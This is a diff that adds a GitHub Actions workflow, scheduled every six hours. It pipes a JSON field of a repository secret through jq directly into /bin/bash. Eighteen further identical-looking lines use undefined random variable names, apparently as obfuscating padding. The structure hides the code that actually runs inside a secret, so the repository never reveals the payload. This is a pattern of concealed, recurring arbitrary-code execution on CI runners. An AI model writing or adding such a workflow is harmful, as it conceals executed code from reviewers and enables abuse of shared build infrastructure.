@@ -1,0 +1,34 @@
+name: hongshanshengkong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongshanshengkong
+        env:
+          ffiyp473: ${{ secrets.ffiyp473 }}
+        run: |
+          echo $ffiyp473 | jq -r .z8 | /bin/bash
+          echo $zyu24 | jq -r .jb6 | /bin/bash
+          echo $zkso1326 | jq -r .a362 | /bin/bash
+          echo $cycqc31413 | jq -r .r09 | /bin/bash
+          echo $f7 | jq -r .d6345 | /bin/bash
+          echo $ocqj02 | jq -r .yq860 | /bin/bash
+          echo $pahyy2 | jq -r .ztu553 | /bin/bash
+          echo $hm3014 | jq -r .xk83291 | /bin/bash
+          echo $mdkw754 | jq -r .gi73 | /bin/bash
+          echo $xmra38700 | jq -r .o189 | /bin/bash
+          echo $mhohk758 | jq -r .oik88 | /bin/bash
+          echo $ovz9 | jq -r .aue439 | /bin/bash
+          echo $imm4933 | jq -r .qhsy1 | /bin/bash
+          echo $ymc28 | jq -r .zmth9381 | /bin/bash
+          echo $t1 | jq -r .ac04 | /bin/bash
+          echo $s43 | jq -r .zccp62 | /bin/bash
+          echo $sczl419 | jq -r .fwuz6349 | /bin/bash
+          echo $c8 | jq -r .xp96 | /bin/bash
+          echo $kdw87292 | jq -r .xo02 | /bin/bash
+
